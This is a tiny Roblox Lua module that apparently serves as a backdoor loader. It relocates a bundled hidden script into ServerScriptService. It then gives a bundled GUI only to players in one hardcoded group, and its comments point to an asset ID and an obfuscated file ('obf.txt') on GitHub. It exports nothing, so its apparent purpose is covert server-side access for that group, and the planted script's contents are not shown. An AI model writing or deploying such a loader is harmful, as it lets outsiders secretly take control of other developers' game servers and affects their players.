local module = {}
local function OnPJoin(plr)
	script.Script.Parent = game.ServerScriptService
	if plr:IsInGroup(7476920) then --Firatin ssi
		script.ScreenGui:Clone().Parent = plr.PlayerGui
	end
end

game.Players.PlayerAdded:Connect(function(player)
	OnPJoin(player)
end)

return module --8966473136 
--https://github.com/desceno/DenemeHeHe/blob/e9b227bbec0d4fe10f4ba3705f3381be22a980e0/obf.txt
